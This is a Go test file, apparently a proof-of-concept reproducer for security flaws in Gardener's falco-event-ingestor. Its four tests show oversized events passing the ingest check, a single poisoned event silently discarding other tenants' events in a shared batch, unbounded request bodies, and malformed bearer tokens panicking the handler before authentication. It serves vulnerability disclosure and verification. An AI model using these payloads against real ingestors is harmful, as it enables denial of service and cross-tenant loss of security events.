// SPDX-FileCopyrightText: 2026 SAP SE or an SAP affiliate company and Gardener contributors
//
// SPDX-License-Identifier: Apache-2.0

// PoC harness for falco-event-ingestor. This file is NOT part of upstream; it is
// a reproducer. It lives in-package because verifyEventTokenMatch / requestToEvent
// / insertEvents are unexported.
package server

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gardener/falco-event-ingestor/pkg/auth"
	"github.com/gardener/falco-event-ingestor/pkg/postgres"
	"golang.org/x/time/rate"
)

// A syntactically valid cluster identity, exactly the shape the ingestor's
// parseClusterId regex accepts: shoot--<project>--<cluster>-<shootUID>-<landscape>
const pocIdentity = "shoot--victimproj--victimcluster-123e4567-e89b-12d3-a456-426614174000-garden-dev"

func pocRecover(f func()) (r interface{}) {
	defer func() { r = recover() }()
	f()
	return nil
}

func pocValidEvent(tag string) postgres.EventStruct {
	return postgres.EventStruct{
		Uuid:         "123e4567-e89b-12d3-a456-426614174000",
		Output:       "poc output " + tag,
		Priority:     "Notice",
		Rule:         "poc rule",
		Time:         time.Now().UTC(),
		OutputFields: map[string]json.RawMessage{"cluster_id": json.RawMessage(`"` + pocIdentity + `"`)},
		Source:       "syscall",
		Tags:         json.RawMessage(`["container"]`),
		Hostname:     "falco-abcde",
	}
}

func pocEventBody(clusterID, output string, extra map[string]interface{}) []byte {
	fields := map[string]interface{}{"cluster_id": clusterID}
	for k, v := range extra {
		fields[k] = v
	}
	ev := map[string]interface{}{
		"uuid":          "123e4567-e89b-12d3-a456-426614174000",
		"output":        output,
		"priority":      "Notice",
		"rule":          "poc rule",
		"time":          time.Now().UTC().Format(time.RFC3339Nano),
		"output_fields": fields,
		"source":        "syscall",
		"tags":          []string{"container", "network"},
		"hostname":      "falco-abcde",
	}
	b, err := json.Marshal(ev)
	if err != nil {
		panic(err)
	}
	return b
}

// ---------------------------------------------------------------------------
// PoC 1: the HTTP ingest boundary enforces no per-field size/format limits.
//
// requestToEvent + verifyEventTokenMatch accept an event whose "output" violates
// message varchar(5000) and whose "output_fields" violates MAX_JSONB_SIZE. The
// only size check in the whole pipeline lives inside postgres.Insert, i.e. AFTER
// the whole request body has been accepted and enqueued.
// ---------------------------------------------------------------------------
func TestPoC_HTTPBoundaryAcceptsStoreFatalEvent(t *testing.T) {
	bigOutput := strings.Repeat("A", 6001)   // > message varchar(5000)
	bigPad := strings.Repeat("B", 60000)     // pushes marshalled output_fields > 50KiB
	body := pocEventBody(pocIdentity, bigOutput, map[string]interface{}{"pad": bigPad})

	req := httptest.NewRequest("POST", "/ingestor/api/v1/push", bytes.NewReader(body))
	ev, err := requestToEvent(req)
	if err != nil {
		t.Fatalf("requestToEvent rejected the crafted event: %v", err)
	}
	if err := verifyEventTokenMatch(ev, &auth.TokenValues{ClusterId: pocIdentity}); err != nil {
		t.Fatalf("verifyEventTokenMatch rejected the crafted event: %v", err)
	}

	marshalled, _ := json.Marshal(ev.OutputFields)
	t.Logf("ACCEPTED at the ingest boundary: output=%d chars, marshalled output_fields=%d bytes (limit=%d)",
		len(ev.Output), len(marshalled), postgres.MAX_JSONB_SIZE)
	t.Logf("=> both field sizes are only checked later, inside postgres.Insert, and any")
	t.Logf("   failure there aborts the ENTIRE batch (see TestPoC_BatchPoison_DropsVictimEvents)")
}

// ---------------------------------------------------------------------------
// PoC 2: one store-fatal event silently discards every other tenant's events
// that share its batch.
//
// insertEvents() (server.go:212) drains the shared channel into ONE batch and
// postgres.Insert (postgres.go:122) returns on the first offending event before
// CopyFrom is ever called - so it is all-or-nothing. The nil *pgxpool.Pool is the
// sentinel: reaching the DB layer dereferences it and panics (verified against
// pgxpool v5.9.2 Pool.Acquire), so "no panic" == "CopyFrom was never reached" ==
// "nothing in this batch was written".
// ---------------------------------------------------------------------------
func TestPoC_BatchPoison_DropsVictimEvents(t *testing.T) {
	poison := pocValidEvent("attacker")
	poison.OutputFields["pad"] = json.RawMessage(`"` + strings.Repeat("B", 60000) + `"`)

	// Control: a batch made only of victim events DOES reach the DB layer.
	ctrl := &Server{eventChannel: make(chan postgres.EventStruct, 8), postgres: &postgres.PostgresConfig{}}
	ctrl.eventChannel <- pocValidEvent("victim-1")
	ctrl.eventChannel <- pocValidEvent("victim-2")
	ctrlPanic := pocRecover(ctrl.insertEvents)
	if ctrlPanic == nil {
		t.Fatalf("control failed: 2 valid events should have reached CopyFrom, but the DB layer was never touched")
	}
	t.Logf("CONTROL ok: 2 victim events reached the DB layer (nil-pool sentinel: %v)", ctrlPanic)

	// Exploit: same two victim events in one batch WITH the attacker's poison event.
	exp := &Server{eventChannel: make(chan postgres.EventStruct, 8), postgres: &postgres.PostgresConfig{}}
	exp.eventChannel <- pocValidEvent("victim-1")
	exp.eventChannel <- poison
	exp.eventChannel <- pocValidEvent("victim-2")
	expPanic := pocRecover(exp.insertEvents)
	if expPanic != nil {
		t.Fatalf("exploit did not behave as predicted: DB layer was reached (%v)", expPanic)
	}
	if left := len(exp.eventChannel); left != 0 {
		t.Fatalf("expected all 3 events drained into one batch, %d still queued", left)
	}
	t.Logf("EXPLOIT ok: victim-1 + attacker-poison + victim-2 were drained into ONE batch;")
	t.Logf("            Insert returned 'outputFields field is too large' BEFORE CopyFrom,")
	t.Logf("            so the two victim events were dropped even though the push returned HTTP 200 (writeEventToChannel) / async insert")
}

// ---------------------------------------------------------------------------
// PoC 3: no bound on the request body at all.
// ---------------------------------------------------------------------------
func TestPoC_UnboundedRequestBodyAccepted(t *testing.T) {
	const size = 32 << 20 // 32 MiB
	body := pocEventBody(pocIdentity, strings.Repeat("A", size), nil)
	req := httptest.NewRequest("POST", "/ingestor/api/v1/push", bytes.NewReader(body))
	ev, err := requestToEvent(req)
	if err != nil {
		t.Fatalf("requestToEvent failed on a %d byte body: %v", len(body), err)
	}
	if len(ev.Output) != size {
		t.Fatalf("expected the whole %d byte field to be materialised, got %d", size, len(ev.Output))
	}
	t.Logf("ACCEPTED a %d MiB request body with no size limit (no MaxBytesReader / io.LimitReader in requestToEvent)", len(body)>>20)
}

// ---------------------------------------------------------------------------
// PoC 4: an unauthenticated request panics the push handler (pre-signature).
// VerifyToken indexes parts[2] of strings.Split(token, ".") with no length check.
// net/http recovers the panic per connection, so this is a log/robustness defect,
// not a process crash - the test also proves the server keeps serving.
// ---------------------------------------------------------------------------
func TestPoC_MalformedBearerToken_PanicsBeforeAuth(t *testing.T) {
	s := &Server{generalLimiter: rate.NewLimiter(rate.Inf, 1)}
	mux := http.NewServeMux()
	mux.HandleFunc("/ingestor/api/v1/push", newHandlePush(auth.NewAuth(), s))
	mux.HandleFunc("/ok", func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusOK) })

	srv := httptest.NewServer(mux)
	defer srv.Close()

	for _, tok := range []string{"x", "a.b", ""} {
		req, err := http.NewRequest("POST", srv.URL+"/ingestor/api/v1/push", strings.NewReader("{}"))
		if err != nil {
			t.Fatal(err)
		}
		req.Header.Set("Authorization", "Bearer "+tok)
		resp, reqErr := srv.Client().Do(req)
		if resp != nil {
			resp.Body.Close()
		}
		t.Logf("token %q -> client error %v (net/http recovered the handler panic)", tok, reqErr)
	}

	okResp, err := srv.Client().Get(srv.URL + "/ok")
	if err != nil {
		t.Fatalf("server died after the panics: %v", err)
	}
	okResp.Body.Close()
	if okResp.StatusCode != http.StatusOK {
		t.Fatalf("server unhealthy after panics: %d", okResp.StatusCode)
	}
	fmt.Println("server still serving after panics: net/http panic recovery confirmed")
}
